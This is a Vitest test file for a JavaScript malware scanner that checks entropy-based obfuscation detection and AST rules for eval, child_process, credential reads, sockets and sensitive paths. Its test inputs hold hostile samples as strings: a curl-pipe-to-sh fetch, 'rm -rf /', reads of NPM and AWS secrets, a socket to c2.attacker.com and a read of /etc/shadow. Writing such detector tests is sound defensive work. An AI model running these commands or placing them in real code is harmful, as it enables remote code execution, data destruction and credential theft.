import { describe, it, expect } from 'vitest';
import { EntropyScanner } from '../src/analyzers/entropy-scanner.js';
import { ASTAnalyzer } from '../src/analyzers/ast-analyzer.js';

describe('EntropyScanner', () => {
  const scanner = new EntropyScanner();

  it('calculates low entropy for repetitive or plain English text', () => {
    const plainText = 'The quick brown fox jumps over the lazy dog. '.repeat(10);
    const entropy = scanner.calculateEntropy(plainText);
    expect(entropy).toBeLessThan(4.5);
  });

  it('calculates high entropy for random or base64 encrypted payloads', () => {
    // Generate high-entropy pseudo-random base64 string
    const highEntropyBytes = Buffer.alloc(256);
    for (let i = 0; i < 256; i++) {
      highEntropyBytes[i] = Math.floor(Math.random() * 256);
    }
    const entropy = scanner.calculateEntropy(highEntropyBytes);
    expect(entropy).toBeGreaterThan(6.0);
  });

  it('flags high-entropy file contents and embedded obfuscated tokens', () => {
    // 120 chars of pseudo-random base64
    const token = 'A1b2C3d4E5f6G7h8I9j0K1L2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z6a7b8c9d0e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0y1z2A3B4C5D6E7F8G9H0';
    const script = `const payload = "${token}";\neval(payload);`;

    const flags = scanner.scanForObfuscation('bundle.min.js', script);
    expect(flags.length).toBeGreaterThanOrEqual(1);
    expect(flags.some((f) => f.ruleId === 'WANNABE-OBFUSCATED-STRING')).toBe(true);
  });
});

describe('ASTAnalyzer', () => {
  const analyzer = new ASTAnalyzer();

  it('detects dynamic eval() and new Function() calls', async () => {
    const code = `
      function run(data) {
        eval(data);
        const fn = new Function('a', 'b', 'return a + b');
      }
    `;

    const flags = await analyzer.analyzeFile('eval-test.js', code);
    expect(flags.some((f) => f.ruleId === 'WANNABE-AST-EVAL')).toBe(true);
    expect(flags.some((f) => f.ruleId === 'WANNABE-AST-FUNCTION-CONSTRUCTOR')).toBe(true);
  });

  it('detects child_process execution methods', async () => {
    const code = `
      import cp from 'child_process';
      cp.exec('curl -s https://malicious.org | sh');
      cp.spawnSync('rm', ['-rf', '/']);
    `;

    const flags = await analyzer.analyzeFile('proc-test.ts', code);
    const cpFlags = flags.filter((f) => f.ruleId === 'WANNABE-AST-CHILD-PROCESS');
    expect(cpFlags.length).toBe(2);
  });

  it('detects sensitive credential harvesting from process.env', async () => {
    const code = `
      const token = process.env.NPM_TOKEN;
      const aws = process.env['AWS_SECRET_ACCESS_KEY'];
    `;

    const flags = await analyzer.analyzeFile('env-test.js', code);
    const envFlags = flags.filter((f) => f.ruleId === 'WANNABE-AST-CREDENTIAL-HARVEST');
    expect(envFlags.length).toBe(2);
    expect(envFlags[0]?.severity).toBe('critical');
  });

  it('detects low-level raw network connections', async () => {
    const code = `
      import net from 'net';
      const client = net.connect({ port: 4444, host: 'c2.attacker.com' });
    `;

    const flags = await analyzer.analyzeFile('socket-test.js', code);
    expect(flags.some((f) => f.ruleId === 'WANNABE-AST-NETWORK-SOCKET')).toBe(true);
  });

  it('detects references to sensitive filesystem paths', async () => {
    const code = `
      fs.readFileSync('/etc/shadow', 'utf-8');
    `;

    const flags = await analyzer.analyzeFile('fs-test.js', code);
    expect(flags.some((f) => f.ruleId === 'WANNABE-AST-SENSITIVE-FS')).toBe(true);
  });

  it('returns zero flags for safe, standard JavaScript code', async () => {
    const code = `
      export function add(a: number, b: number): number {
        console.log('Adding', a, b);
        return a + b;
      }
    `;

    const flags = await analyzer.analyzeFile('safe.ts', code);
    expect(flags.length).toBe(0);
  });

  it('gracefully skips non-code file extensions', async () => {
    const code = 'eval("alert(1)");';
    const flags = await analyzer.analyzeFile('image.png', code);
    expect(flags.length).toBe(0);
  });
});
